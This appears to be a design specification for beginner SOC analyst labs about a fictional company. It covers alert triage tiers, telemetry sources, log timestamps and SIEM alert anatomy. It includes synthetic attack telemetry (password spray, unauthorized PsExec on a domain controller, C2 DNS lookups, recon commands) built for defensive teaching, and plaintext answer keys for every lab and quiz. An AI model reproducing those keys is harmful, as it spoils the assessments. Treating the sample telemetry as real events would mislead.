`README-evidence.md` and `answers.template.txt` are static (not generated): they are contract documentation and a fill-in skeleton, not evidence — the generator owns only `events.jsonl`, `alert-sample.json`, and the q1/q2 key values; q3/q4 are convention-derived constants the scenario yaml pins so the single-source-of-truth rule still holds for the whole key block.

### L0.3 - The SOC in one lab - tiers, the alert lifecycle, what Tier 1 owns vs escalates

| id | title | type | gate | est_minutes |
|----|-------|------|------|-------------|
| L0.3 | The SOC in one lab - tiers, the alert lifecycle, what Tier 1 owns vs escalates | DECODE | true | 20 |

**TEACHING ARTIFACT**
- **Files staged** (`files/`):
  - `sop-excerpt.md` (static prose, ~1 page): Coppermine SOC charter with exactly four sections. "Tier duties": T1 = triage, disposition, first scoping, ticket + tuning feedback; T2 = investigation + response; T3 = hunt + detection engineering. "Alert lifecycle": new → triage → disposition (close FP/BTP | escalate TP) → containment. "Escalate when" (the 4 triggers q1–q5 grade against): (a) confirmed compromise, (b) scope >1 host, (c) credential compromise, (d) response needs containment authority. "Documented authorized activity": svc_backup robocopy nightly 02:00Z SRV-BACKUP→FS01; t.aoki admin tooling only under CHG tickets (CHG-2143, Tue 2026-03-10 10:00Z). Cards 4 and 5 are answerable ONLY by reading this section.
  - `cases.md` (GENERATED from `s0-tier-cases.yaml`): five cards, each headed `## CASE n — alert CM-A-n — <rule name>`, 3–5 lines, defanged prose. Card text carries the answer; keys never appear in the file.
  - `answers.template.txt`: `# h = Tier 1 handles, e = Tier 1 escalates` then lines `q1=` … `q5=`.
- **The five cards** (compressed; full 3–5-line renderings come from scenario yaml):
  1. **CM-A-1 "Password spray — OWA/VPN auth failures"**: 2026-03-11 14:05–14:25Z, 203.0.113.66 drives 4625 bursts across 40+ COPPERMINE accounts; ONE 4624 type 3 success m.reyes 2026-03-11T14:22:31Z; Entra sign-in success with no MFA claim, geo inconsistent with her 13:58Z Duluth VPN session. **key q1=e** (triggers a+c: credential compromise confirmed).
  2. **CM-A-2 "AV quarantine — adware"**: 2026-03-10T16:12Z Defender on WKS-HD-03 (j.walsh) quarantines commodity adware bundler "PDFTurbo Setup" at download; no 4688 execution, no Sysmon 3 connections, no other hosts. **key q2=h** (contained, zero triggers: close + user-education ticket).
  3. **CM-A-3 "User-reported phish"**: 2026-03-09T13:30Z d.okafor forwards mail from billing@copperm1ne-billing[.]example (sender IP 198.51.100.71) linking hxxp://copperm1ne-billing[.]example/invoice; zeek http/dns show no request from 10.20.31.112; no child processes on endpoint. **key q3=h** (no click; verdict + block-sender ticket + IOC note is T1 work).
  4. **CM-A-4 "Remote admin tool on DC"**: 2026-03-12T19:41Z PSEXESVC service installed on DC01 as t.aoki; no CHG ticket covers that window (charter lists only CHG-2143 on 03-10); 19:44Z 4720 new account `it_svc_tmp` + 4732 added to Administrators. **key q4=e** (triggers a+d: confirmed compromise on a DC, containment authority needed).
  5. **CM-A-5 "Mass file copy"**: 2026-03-12T02:00:14Z SRV-BACKUP→FS01 large SMB copy; process robocopy.exe as svc_backup, exactly matching the charter's documented nightly job. **key q5=h** (BTP — close with tuning note to suppress the scheduled job).
- **Learner task**: read `sop-excerpt.md`, sanity-run `jq --version` and `tshark --version` (GUIDED STEPS step 2 — mirrors the gate assertions), read `cases.md`, then `cp answers.template.txt answers.txt` and set each qN to `h` or `e`. Template grammar: `qN=` + single lowercase token `h|e`, one per line, q1–q5.
- **Grading** (`check.sh`, canonical pattern per Section 2.1):
  1. `assert_cmd_ok "jq responds" "install jq — see L0.1" -- jq --version` — Phase 0 gate clause "tools respond"
  2. `assert_cmd_ok "tshark responds" "install tshark — see L0.1" -- tshark --version`
  3. `assert_cmd_ok "dig responds" "install dnsutils — see L0.1" -- dig -v`
  4. `assert_cmd_ok "whois responds" "install whois — see L0.1" -- whois --version`
  5. `assert_cmd_ok "rg responds" "install ripgrep — see L0.1" -- rg --version`
  6. `assert_file_exists answers.txt`
  7. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then for N in 1..5: `assert_file_contains ".answers.norm" "^qN=<KN>$"`
  8. `ck_summary`
  Embedded key block (generator-written, base64: e=`ZQ==`, h=`aA==`):
  `# --- BEGIN GENERATED KEY (genevidence: s0-tier-cases) ---` / `K1=ZQ== K2=aA== K3=aA== K4=ZQ== K5=aA==` / `# --- END GENERATED KEY ---`
- **Kit files**:
  - `meta.json`: `{id: L0.3, title: <map title>, type: DECODE, objective: "Split five Coppermine alerts into Tier 1 handles vs Tier 1 escalates using the charter's lifecycle and four escalation triggers", gate: true, est_minutes: 20}`
  - `quiz.json` (3 questions):
    1. (choice) "An alert is closed BTP. What happened?" a) rule logic misfired on benign traffic b) rule fired correctly on real behavior, but the behavior was authorized c) it was a true positive escalated to Tier 2 d) telemetry was missing → **key: b**
    2. (text) "In the lifecycle new → triage → disposition → containment, which verdict is the only one that moves an alert forward toward containment? Answer with the lowercase verdict code (e.g. `fp`)." → **key: `tp`**, accept_b64 variant `true positive`
    3. (choice) "Per sop-excerpt.md, which action is OUTSIDE Tier 1 authority?" a) closing an alert as FP b) filing a tuning note c) attaching evidence event ids to the ticket d) isolating WKS-ACCT-07 from the network → **key: d**
  - `hints.json`: L1: "Score each card against the four 'Escalate when' triggers in sop-excerpt.md; a card that touches zero triggers stays with Tier 1 no matter how scary the rule name sounds." L2: "Exactly two cards escalate: one involves a credential that now works for someone who is not the user, the other needs an action Tier 1 has no authority to take on a domain controller. Cards mentioning documented authorized activity should point you at the charter's last section." L3 (rationales surfaced from scenario yaml): "1: confirmed credential compromise (spray success + no-MFA sign-in) → e. 2: AV already contained it, nothing executed → h. 3: no click evidence; verdict + block ticket is Tier 1 work → h. 4: unauthorized PsExec + new admin account on DC01 → e. 5: documented svc_backup 02:00Z job — BTP, close with a tuning note → h."
  - `recap.md` (3 lines): `Tier 1 triages, dispositions, scopes first, and feeds tickets and tuning notes; Tier 2 investigates and responds; Tier 3 hunts and builds detections.` / `An alert moves new to triage to disposition: close it as FP or BTP, escalate only a TP toward containment.` / `Escalate on confirmed compromise, more than one host, credential compromise, or any response needing containment authority; everything else Tier 1 handles and documents.`
  - No `recall.json` (L0.1 opens Phase 0).

**EVIDENCE SPEC**
```yaml
scenario: s0-tier-cases
window: {start: 2026-03-09T00:00:00Z, end: 2026-03-13T23:59:59Z}
actors: [m.reyes, d.okafor, j.walsh, t.aoki, svc_backup]
hosts: {DC01: 10.20.10.5, FS01: 10.20.10.8, SRV-BACKUP: 10.20.10.9,
        WKS-HD-03: 10.20.30.103, WKS-ENG-12: 10.20.31.112}
ips: {spray_c2: 203.0.113.66, phish_sender: 198.51.100.71, vpn_gw: 192.0.2.45}
benign_background:
  - {ref: svc_backup_robocopy, at: 2026-03-12T02:00:14Z, card: 5}
  - {ref: chg_2143_psexec, at: 2026-03-10T10:00:00Z}   # cited in charter; contrast for card 4
attacker_actions:
  - {ref: m1_spray_one_success, at: 2026-03-11T14:22:31Z, card: 1, src: 203.0.113.66, user: m.reyes}
  - {ref: adware_quarantined,   at: 2026-03-10T16:12:00Z, card: 2, host: WKS-HD-03}
  - {ref: phish_reported_no_click, at: 2026-03-09T13:30:00Z, card: 3,
     sender: billing@copperm1ne-billing.example, target: d.okafor}
  - {ref: rogue_psexec_dc01, at: 2026-03-12T19:41:00Z, card: 4,
     artifacts: [PSEXESVC install, 4720 it_svc_tmp, 4732 Administrators]}
cards:   # generator renders these to cases.md AND emits the key block; keys can never drift
  - {n: 1, alert: CM-A-1, key: e, rationale: "confirmed credential compromise: spray success + no-MFA sign-in"}
  - {n: 2, alert: CM-A-2, key: h, rationale: "AV contained it; no execution, no spread"}
  - {n: 3, alert: CM-A-3, key: h, rationale: "no click evidence; verdict + block ticket is Tier 1 work"}
  - {n: 4, alert: CM-A-4, key: e, rationale: "unauthorized PsExec + new admin on DC01; needs containment authority"}
  - {n: 5, alert: CM-A-5, key: h, rationale: "documented svc_backup job; BTP, close with tuning note"}
emit:
  cases.md: files/cases.md
  key_block: check.sh   # between BEGIN/END GENERATED KEY markers
answer_key: {q1: e, q2: h, q3: h, q4: e, q5: h}
static_files: [sop-excerpt.md, answers.template.txt]
# No raw telemetry generated: the concept is disposition boundaries, not artifact parsing.
# cases.md is still generator-emitted from this yaml (evidence rule satisfied); card
# timestamps/entities intentionally echo M1/M2-adjacent motifs learners will meet raw in Phase 1.
```

## 5. Phase 1 — labs

### L1.1 - Telemetry sources - what gets logged where (network, endpoint, identity)

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L1.1 | Telemetry sources - what gets logged where (network, endpoint, identity) | DECODE | false | 15 |

Dir `tracks/soc/phases/p1/L1.1-telemetry-sources/`. meta.json objective: "Match eight observable statements to the one telemetry source (a-f) that records them; internalize network=conversations, endpoint=commands, identity=MFA/app."

**TEACHING ARTIFACT**
- **Files staged** (`files/` -> workspace; all evidence generated from s1-telemetry, RAW = never defanged):
  - `telemetry/a-zeek-conn.log` - zeek TSV, `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes event_id`; 7 rows: WKS-ACCT-07 10.20.30.107 -> 192.0.2.60 tcp/443 ssl incl. ONE duration=2411s row (q6 anchor, CM-0310-0031); DC01 -> 192.0.2.10 udp/123; WKS-ENG-12 -> 192.0.2.60 tcp/443. No command/content fields anywhere (the taught gap).
  - `telemetry/b-zeek-dns.log` - zeek TSV, `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto query qtype_name rcode_name answers event_id`; 6 workstation->DC01 rows (saas.mail.example A, coppermine.example SOA, wpad NXDOMAIN) plus ONE row 2026-03-10T13:12:47Z id.orig_h=10.20.31.112 query=c2.stonewick.example qtype=A rcode=NOERROR answers=203.0.113.66 (q2 anchor, CM-0310-0057, M2/M3 foreshadow).
  - `telemetry/c-windows-security.json` - ECS JSON lines from DC01, fields `event.id,@timestamp,event.code,host.name,user.name,winlog.logon.type,source.ip,event.outcome`; rows: 4625 j.walsh 09:14:11Z from 10.20.30.103 (q5 anchor CM-0310-0007), 4624 j.walsh 09:14:29Z (CM-0310-0008), 4624 type 3 t.aoki 10:00:12Z PsExec under CHG-2143 (q7 anchor CM-0310-0019).
  - `telemetry/d-sysmon.json` - ECS JSON lines, WKS-ACCT-07, event.code "1", fields incl. `process.name,process.command_line,process.parent.name,user.name`; rows: explorer.exe->cmd.exe 14:02:55Z (CM-0310-0061), cmd.exe->whoami.exe command_line "whoami /all" 14:03:08Z (q1 anchor CM-0310-0062), one benign OUTLOOK.EXE start.
  - `telemetry/e-auth.log` - WEB01 sshd syslog, rsyslog RFC3339 UTC timestamps; lines: `Failed password for invalid user dokafor from 10.20.31.112` 11:37:02Z (q3 anchor CM-0310-0022), `Accepted publickey for d.okafor from 10.20.31.112` 11:37:41Z (q8 anchor CM-0310-0023), session-opened line.
  - `telemetry/f-entra-signin.json` - JSON lines `{event.id,@timestamp,user,app,source_ip,result,mfa}`; 3 rows m.reyes app="OWA" ip=192.0.2.44 result="success" mfa="satisfied" 13:05-15:07Z (q4 anchor CM-0310-0045). The `mfa` field is the only MFA evidence in the whole pack.
  - `answers.template.txt` - lines `q1=` .. `q8=`.
- **Learner task**: skim each file's `#fields`/JSON keys (GUIDED STEPS: `head -3` the TSVs, `jq -c '{code:.event.code}'` the JSON), then map lab.md's 8 statements to source letters. lab.md statements (prose defanged) with keyed answers:
  1. "The exact command line `whoami /all` was typed on an Accounts Payable workstation." -> `d`
  2. "A workstation asked DNS for c2.stonewick[.]example and got an answer." -> `b`
  3. "An SSH login to WEB01 failed for an invalid username." -> `e`
  4. "m.reyes signed in to OWA and satisfied an MFA prompt." -> `f`
  5. "A domain logon to DC01 failed with a bad password." -> `c`
  6. "A workstation held a ~40-minute encrypted TLS session; only bytes and duration are visible." -> `a`
  7. "t.aoki authenticated to DC01 over the network (logon type 3)." -> `c`
  8. "A user logged in to WEB01 via SSH publickey." -> `e`
  Template (copy to `answers.txt`; value grammar = single letter a-f, lowercase): `q1=` `q2=` `q3=` `q4=` `q5=` `q6=` `q7=` `q8=` (one per line).
- **Grading** (check.sh, sources `$LAB_CHECKLIB`, collect-all):
  1. `assert_file_exists answers.txt`
  2. Decode `KEY_B64` from the generated block `# --- BEGIN GENERATED KEY (genevidence: s1-telemetry) ---` (base64 of `q1=d q2=b q3=e q4=f q5=c q6=a q7=c q8=e`).
  3. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then loop q1..q8: `assert_file_contains ".answers.norm" "^qN=<decoded KN>$"` (collect-all; `harness_err` reserved for a missing/corrupt KEY block, never for a wrong answer).
  4. `ck_summary` (last line).
- **Kit files**:
  - quiz.json (3, answers base64-encoded in file; keyed here in plain):
    1. choice "A beacon talks to its C2 over TLS/443. Which source proves the connection happened but can NEVER show what was sent?" [a zeek conn.log / d sysmon / f entra sign-ins / e auth.log] -> **a zeek conn.log**
    2. choice "An attacker runs `powershell -enc <base64>`. Which single source records the full command line?" [a / b / c / d] -> **d** (sysmon event.code 1)
    3. choice "A password spray hits OWA and one login succeeds. Which telemetry plane tells you whether MFA was satisfied on that success?" [network / endpoint / identity] -> **identity**
  - hints.json: L1 "Read each file's header first: zeek TSVs name their columns on the #fields line; the JSON sources carry event.code. List what each file CANNOT see before matching anything." L2 "Sort each statement into a plane: mentions a process or command line -> endpoint; a connection, DNS name, or byte count -> network; an app, MFA, or sign-in -> identity. Then pick the letter inside that plane." L3 "Command lines live only in d (sysmon event.code 1); DNS names only in b; MFA/app only in f; Windows 4624/4625 only in c; sshd lines only in e; durations/bytes only in a."
  - recap.md (3 lines): `Network telemetry (zeek conn/dns) proves a conversation happened - hosts, ports, bytes, names asked - but TLS hides content and it never sees command lines.` / `Endpoint telemetry (Sysmon, Windows Security) sees inside the host: processes, full command lines, and local or domain logons.` / `Identity telemetry (Entra sign-ins) is the only plane that records app, MFA result, and source IP for cloud and VPN access.`
  - recall.json (phase opener, 5, non-gating): 1) "Ticket: 'mouse moving by itself' on WKS-HD-03 - Tier 1 handles (h) or escalates (e)?" -> `e`, source L0.3. 2) "Immediately after an alert fires, what does Tier 1 do first - triage or escalate?" -> `triage`, source L0.3. 3) "Which toolbelt tool parses JSON evidence: jq, tshark, or whois?" -> `jq`, source L0.1. 4) "Defang hxxp form of http://c2.stonewick.example" -> `hxxp://c2.stonewick[.]example`, source L0.2 (accept the all-dots form too — recall is non-gating). 5) "Does editing files in workspace/soc/<id>/ modify the shipped lab under tracks/? (yes/no)" -> `no`, source L0.2.

**EVIDENCE SPEC**
```yaml
scenario: s1-telemetry            # tools/genevidence/s1-telemetry.yaml
lab: L1.1
window: {start: 2026-03-10T09:00:00Z, end: 2026-03-10T17:00:00Z}   # Tue, inside scenario week
actors: [m.reyes, d.okafor, j.walsh, t.aoki]
hosts: {DC01: 10.20.10.5, WEB01: 10.20.10.20, WKS-ACCT-07: 10.20.30.107,
        WKS-ENG-12: 10.20.31.112, WKS-HD-03: 10.20.30.103}
externals:
  saas.mail.example: 192.0.2.60   # benign webmail CDN, declared here to avoid ad-hoc IPs
  ntp: 192.0.2.10
  c2.stonewick.example: 203.0.113.66
benign_background:
  - {t: 2026-03-10T09:14:11Z, ev: 4625 j.walsh bad password DC01 from 10.20.30.103, id: CM-0310-0007}
  - {t: 2026-03-10T09:14:29Z, ev: 4624 j.walsh DC01, id: CM-0310-0008}
  - {t: 2026-03-10T10:00:12Z, ev: 4624 type3 t.aoki -> DC01 (PsExec, CHG-2143), id: CM-0310-0019}
  - {t: 2026-03-10T11:37:02Z, ev: sshd failed invalid user dokafor from 10.20.31.112, id: CM-0310-0022}
  - {t: 2026-03-10T11:37:41Z, ev: sshd accepted publickey d.okafor from 10.20.31.112, id: CM-0310-0023}
  - {t: 2026-03-10T13:05:00Z..15:07:00Z, ev: 3x entra sign-in m.reyes app=OWA ip=192.0.2.44 mfa=satisfied, id: CM-0310-0045..0047}
  - {t: 2026-03-10T14:02:55Z, ev: sysmon1 explorer.exe->cmd.exe WKS-ACCT-07, id: CM-0310-0061}
  - {t: 2026-03-10T14:03:08Z, ev: sysmon1 cmd.exe->whoami.exe "whoami /all", id: CM-0310-0062}
  - {t: all-day, ev: conn noise to saas.mail.example:443 (one duration=2411s row id CM-0310-0031), ntp 123/udp, wpad NXDOMAIN dns rows}
attacker_actions:
  - {t: 2026-03-10T13:12:47Z, ev: WKS-ENG-12 -> DC01 dns A c2.stonewick.example = 203.0.113.66,
     id: CM-0310-0057, note: single teaser query, NO follow-on conn rows}
emit:
  zeek_conn: files/telemetry/a-zeek-conn.log
  zeek_dns: files/telemetry/b-zeek-dns.log
  win_security_ecs[DC01]: files/telemetry/c-windows-security.json
  sysmon_ecs[WKS-ACCT-07]: files/telemetry/d-sysmon.json
  authlog[WEB01]: files/telemetry/e-auth.log
  entra_signin[m.reyes]: files/telemetry/f-entra-signin.json
  answers_template: files/answers.template.txt
answer_key:                       # generator embeds as base64 KEY block in check.sh
  q1: d   # CM-0310-0062
  q2: b   # CM-0310-0057
  q3: e   # CM-0310-0022
  q4: f   # CM-0310-0045
  q5: c   # CM-0310-0007
  q6: a   # CM-0310-0031
  q7: c   # CM-0310-0019
  q8: e   # CM-0310-0023
```

### L1.2 - Anatomy of a log - timestamps, UTC discipline, ECS field names
| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L1.2 | Anatomy of a log - timestamps, UTC discipline, ECS field names | DECODE | false | 15 |

One concept: one instant, three spellings. Five events from Tue 2026-03-10 (13:58-14:05Z = 08:58-09:05 CDT, straddling both an hour boundary and a rendering boundary) shown as local-time syslog, raw Windows JSON, and normalized ECS. Naive ordering fails two ways: ecs.jsonl file order is ingest order (two adjacent pairs inverted), and mixed raw wall-clock text sorts syslog-local before Windows-UTC.

**TEACHING ARTIFACT**

Files staged (`files/` -> workspace):
- `raw-syslog.txt` - 5 classic syslog lines, collector in America/Chicago local (CDT), **no year, no tz marker**, ascending local time. Lines: (1) `Mar 10 08:59:57 web01 sshd[2214]: Accepted publickey for t.aoki from 192.0.2.45 port 60312 ssh2` [q1 source line]; (2) `Mar 10 09:00:33 dc01 MSWinEventLog ... 4625 ... Account Name: j.walsh ... Source Network Address: 203.0.113.66` (Snare-style forward); (3) `Mar 10 09:01:05 dc01 MSWinEventLog ... DNS Server 256 ... query fs01.coppermine.example type A from 10.20.31.112`; (4) `Mar 10 09:01:48 dc01 MSWinEventLog ... 4625 ... m.reyes ... 203.0.113.66`; (5) `Mar 10 09:03:10 web01 sshd[2231]: Failed password for root from 192.0.2.150 port 44872 ssh2` (Bluewater, authorized 2026-03-10). Local times carry q5 (offset -05:00).
- `windows-raw.json` - EVTX-export JSON array of the **3 DC01-origin events only** (sshd never emits EVTX; lab.md says so explicitly - deliberate realism refinement of "all five in all three files"). Each: `Event.System.{Provider, EventID, EventRecordID, Computer:"DC01.coppermine.example", TimeCreated.SystemTime:"2026-03-10T14:00:33.412Z"}` (UTC ISO - the honest spelling) + `Event.EventData.{TargetUserName, IpAddress, LogonType:3}`.
- `ecs.jsonl` - all 5 events, **file order = ingest order e1..e5**, per record: `labels.exercise_id` ("e1".."e5"), `@timestamp` (true UTC occurrence), `event.ingested` (arrival - later, out of chrono order), `event.id` (CM-0310-0210..0214), `event.code` ("4625"/"256", Windows events only) [q4], `event.category`, `event.outcome`, `source.ip` [q3], `user.name`, `host.name`, `message` (original raw line). Ingest story in lab.md: WEB01 filebeat had a 90s backoff; DC01 DNS-analytic channel ships on a 2-min timer; DC01 Security is near-realtime.
- `events-map.csv` - `label,event_id,summary` (no timestamps): e1=cm-0310-0211 4625 j.walsh; e2=cm-0310-0210 sshd accept t.aoki; e3=cm-0310-0213 4625 m.reyes; e4=cm-0310-0212 dns query fs01; e5=cm-0310-0214 sshd fail root.
- `answers.template.txt` - the 5 `qN=` lines plus `#` grammar comments.

`lab.md`: BRIEF (<=10 lines) sets the "same instant, three spellings" frame; GUIDED STEPS: (1) `grep j.walsh` across all three files, compare the three time strings for that one event; (2) convert both syslog lines to UTC (+05:00); (3) `jq -r '[.labels.exercise_id,."@timestamp",."event".ingested]|@tsv' ecs.jsonl` and sort by @timestamp; (4) ECS mini-table (@timestamp / source.ip / user.name / event.code / event.category); (5) fill answers.txt.

Learner task: `cp answers.template.txt answers.txt`, complete every line. Template:
```
q1=   # UTC instant of the sshd "Accepted publickey" line, ISO-8601 lowercase, e.g. 2026-03-09t00:00:00z
q2=   # true chronological order of e1..e5, comma-joined, no spaces
q3=   # ECS field name carrying the client/source IP
q4=   # ECS field name carrying the Windows event number
q5=   # UTC offset of the syslog collector during the scenario week, +/-HH:MM
```

Grading (`check.sh`, sources $LAB_CHECKLIB, collect-all, `ck_summary` last):
1. `assert_file_exists ecs.jsonl`; `assert_file_exists raw-syslog.txt`; `assert_file_exists answers.txt`
2. prep (plain bash): normalized copy `.answers.norm` = lowercase, comments stripped, whitespace collapsed/trimmed
3. `assert_file_contains .answers.norm '^q1=2026-03-10t13:59:57z$'`
4. `assert_file_contains .answers.norm '^q2=e2,e1,e4,e3,e5$'`
5. `assert_file_contains .answers.norm '^q3=source\.ip$'`
6. `assert_file_contains .answers.norm '^q4=event\.code$'`
7. `assert_file_contains .answers.norm '^q5=-05:00$'`
Expected values are decoded at runtime from base64 constants inside `# --- BEGIN GENERATED KEY (genevidence: s1-log-anatomy) ---` / END markers (regex dots escaped when patterns are built); no literal answers outside the block.

Kit files:
- `meta.json`: id L1.2, type DECODE, gate false, est_minutes 15, objective "Read one event in three log dialects, convert local syslog time to UTC, and order events by @timestamp using ECS field names."
- `quiz.json` (3, answers base64 at build): Q1 choice "A record shows event.ingested=14:04:00Z and @timestamp=14:00:33Z. When did the logon attempt actually happen?" a) @timestamp b) event.ingested c) whichever is later d) the syslog header time -> **a**. Q2 choice "Why are Coppermine SOC tickets written in UTC only?" a) one shared clock orders events from hosts in any timezone without conversion errors b) UTC is more precise c) SIEM licenses require it d) local time is illegal to log -> **a**. Q3 choice "Classic syslog `Mar 10 08:59:57` omits which two things you need to place it on a timeline?" a) year and timezone offset b) hostname and PID c) seconds and milliseconds d) username and IP -> **a**.
- `hints.json`: L1 "Pick the j.walsh 4625 and find it in all three files (grep j.walsh). Compare its three time strings before ordering anything." L2 "raw-syslog.txt is Duluth local time (CDT, UTC-05:00) with no marker and no year; SystemTime and @timestamp are already UTC. Add 5 hours to every syslog time first." L3 "Only @timestamp orders events: `jq -r '[.labels.exercise_id,.\"@timestamp\"]|@tsv' ecs.jsonl | sort -k2`. File order is ingest order and is wrong for two adjacent pairs."
- `recap.md`: `One instant has many spellings: local syslog text, Windows SystemTime, and ECS @timestamp can all describe the same moment.` / `Convert everything to UTC before comparing; classic syslog has no year and no timezone, and file order only shows arrival, never occurrence.` / `Core ECS names: @timestamp for when it happened, source.ip for the client, user.name for the account, event.code for the Windows event number.`
- No `recall.json` (L1.1 is the phase opener).

**EVIDENCE SPEC**
```yaml
scenario: s1-log-anatomy            # tools/genevidence/s1-log-anatomy.yaml
lab: L1.2
window: {start: 2026-03-10T13:58:00Z, end: 2026-03-10T14:05:00Z}   # inside scenario week
site_tz: America/Chicago            # CDT, -05:00 across the window (q5)
hosts: {web01: 10.20.10.20, dc01: 10.20.10.5, wks-eng-12: 10.20.31.112}
actors: [t.aoki, j.walsh, m.reyes, root(bluewater), svc-none]
externals: {vpn_gw: 192.0.2.45, sprayer_c2: 203.0.113.66, bluewater: 192.0.2.150}
benign_background: none  # single-burst decode lab; Bluewater ssh probe doubles as benign noise
events:   # single source list -> all renderings + key derive from here
  - {label: e2, event_id: CM-0310-0210, t: 2026-03-10T13:59:57Z, ingested: 2026-03-10T14:01:30Z,
     host: web01, kind: sshd_accept, user: t.aoki, src: 192.0.2.45}
  - {label: e1, event_id: CM-0310-0211, t: 2026-03-10T14:00:33Z, ingested: 2026-03-10T14:00:34Z,
     host: dc01, kind: win4625, user: j.walsh, src: 203.0.113.66}           # M1-adjacent probe
  - {label: e4, event_id: CM-0310-0212, t: 2026-03-10T14:01:05Z, ingested: 2026-03-10T14:03:05Z,
     host: dc01, kind: dns_query, client: 10.20.31.112, q: fs01.coppermine.example, code: 256}
  - {label: e3, event_id: CM-0310-0213, t: 2026-03-10T14:01:48Z, ingested: 2026-03-10T14:01:49Z,
     host: dc01, kind: win4625, user: m.reyes, src: 203.0.113.66}           # M1-adjacent probe
  - {label: e5, event_id: CM-0310-0214, t: 2026-03-10T14:03:10Z, ingested: 2026-03-10T14:04:40Z,
     host: web01, kind: sshd_fail, user: root, src: 192.0.2.150}            # Bluewater, authorized
emit:
  syslog_local_noyear: files/raw-syslog.txt        # all 5; local CDT; ascending local time
  evtx_json_utc:       files/windows-raw.json      # dc01-origin 3 only (e1,e3,e4)
  ecs_jsonl:           files/ecs.jsonl             # all 5; FILE ORDER = ingest order e1..e5
  label_map:           files/events-map.csv
  answers_template:    files/answers.template.txt
  key_block:           check.sh generated-key section
answer_key:            # must match Grading verbatim
  q1: 2026-03-10t13:59:57z
  q2: e2,e1,e4,e3,e5   # file/text order e1..e5 has two adjacent pairs inverted: (e1,e2),(e3,e4)
  q3: source.ip
  q4: event.code
  q5: "-05:00"
verifier_checks: [timestamps_in_window, ips_hosts_consistent, key_event_ids_present_in_ecs,
  syslog_equals_utc_minus_5, ingest_order_matches_file_order]
```

### L1.3 - Anatomy of an alert - rule metadata, severity, and the evidence behind it

| id | title | type | gate | est_minutes |
|----|-------|------|------|-------------|
| L1.3 | Anatomy of an alert - rule metadata, severity, and the evidence behind it | DECODE | false | 15 |

**TEACHING ARTIFACT**

- **Files staged** (`tracks/soc/phases/p1/L1.3-alert-anatomy/files/`; all generator-emitted from `s1-alert-anatomy.yaml` except the template):
  - `alert-CM-A-1024.json` — one SIEM alert, canonical shape, pretty-printed. `alert.id` "CM-A-1024"; `@timestamp` "2026-03-11T14:26:04Z"; `status` "new"; `rule`: `id` "CM-R-0117" (**carries q1**), `name` "Password Spray - Many Accounts, One Source", `version` 3, `severity` "high" (STATIC, rule-assigned — **q2 names this field path**), `risk_score` 73 (DYNAMIC, computed per alert; lives inside `rule` per the canonical alert shape — quiz Q1 teaches the static/dynamic distinction), `threat`: tactic {id "TA0006", name "credential-access"}, technique {id "T1110.003", name "Password Spraying"}; `entities`: `source.ip` "203.0.113.66" (**carries q4**), `user.names_sampled` ["a.brandt","d.okafor","p.silva"], `user.names_total` 42, `host.name` "DC01"; `evidence`: `event_ids` ["CM-0311-0107","CM-0311-0121","CM-0311-0135"] (**carries q3**; array order = generator order), `query` "event.code:4625 AND source.ip:203.0.113.66 AND @timestamp:[2026-03-11T14:05:00Z TO 2026-03-11T14:25:00Z]".
  - `events/raw.jsonl` — 15 Winlogbeat-shaped ECS JSON lines, chronological, one event per line; fields per line: `event.id`, `event.code`, `event.outcome`, `@timestamp`, `host.name`, `user.name`, `source.ip`, `winlog.logon.type`. Content: 13x 4625 spray failures from 203.0.113.66 against DC01, 13 distinct users, 14:05:12Z–14:21:58Z (the 3 cited ids among them); 1x benign 4625 j.walsh from 10.20.30.103 at 14:11:47Z (event.id CM-0311-0119 — breaks "every event is the attacker" and makes q4 require reading the cited events); 1x 4624 logon-type-3 SUCCESS, m.reyes from 203.0.113.66 at 2026-03-11T14:22:31Z, event.id CM-0311-0142 (**carries q5** — present in raw.jsonl, deliberately ABSENT from evidence.event_ids). `source.ip` is the only IP-valued field in event lines, keeping q4 unambiguous.
  - `answers.template.txt` — five lines `q1=` .. `q5=`.
- **Learner task**: jq-walk the alert to answer q1–q4 entirely from it; for q5 pivot into `events/raw.jsonl` to find the success the alert never cited (Phase-7 seed: an alert is a claim about evidence, and the evidence can be incomplete). Fill the template as `answers.txt` in the workspace. Template + value grammar:
  ```
  q1=   # rule id, lowercase                                          -> cm-r-0117
  q2=   # dotted JSON path of the STATIC rule-assigned severity field -> rule.severity
  q3=   # 3 cited event ids, lowercase, comma-joined, no spaces,
        # in evidence.event_ids array order                           -> cm-0311-0107,cm-0311-0121,cm-0311-0135
  q4=   # the one entity value unchanged across all 3 cited events
        # (an IPv4; user.name differs per event)                      -> 203.0.113.66
  q5=   # event.id of the auth SUCCESS the alert did NOT cite         -> cm-0311-0142
  ```
- **Grading** (`check.sh` sources `$LAB_CHECKLIB`; keys embedded base64 between `# --- BEGIN GENERATED KEY (genevidence: s1-alert-anatomy) ---` / `# --- END GENERATED KEY ---`, written by the generator):
  1. `assert_file_exists answers.txt`
  2. `assert_file_contains answers.txt '^q1='` … `'^q5='` (five presence checks)
  3. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then per qN: `assert_file_contains ".answers.norm" "^qN=<decoded KEY_QN>$"` (collect-all; never leaks the key on failure)
  4. `ck_summary` as the last line; 3-question quiz runs after and gates at 3/3
- **Kit files**:
  - `meta.json`: {id "L1.3", title as above, type "DECODE", objective "Read a SIEM alert as a structured claim: rule metadata, static severity vs dynamic risk_score, and the exact events cited as evidence", gate false, est_minutes 15}.
  - `lab.md`: `## BRIEF` (≤10 lines, defanged prose: 203.0.113[.]66) frames "an alert is a claim about evidence"; `## GUIDED STEPS` = jq walk of alert fields, then grep/jq pivots into raw.jsonl for q4/q5.
  - `quiz.json` (answers base64 in the real file):
    - Q1 (choice) "CM-A-1024 shows rule.severity 'high' and risk_score 73. If the same rule fires tomorrow on 6 accounts instead of 42, what changes?" A) severity B) risk_score C) both D) neither → **B** (severity is static rule metadata; risk_score is recomputed per alert).
    - Q2 (choice) "What does evidence.event_ids promise?" A) every event involved in the incident B) exactly the events that made the rule fire, nothing more C) all events from that source ip that day D) events already reviewed by tier 2 → **B**.
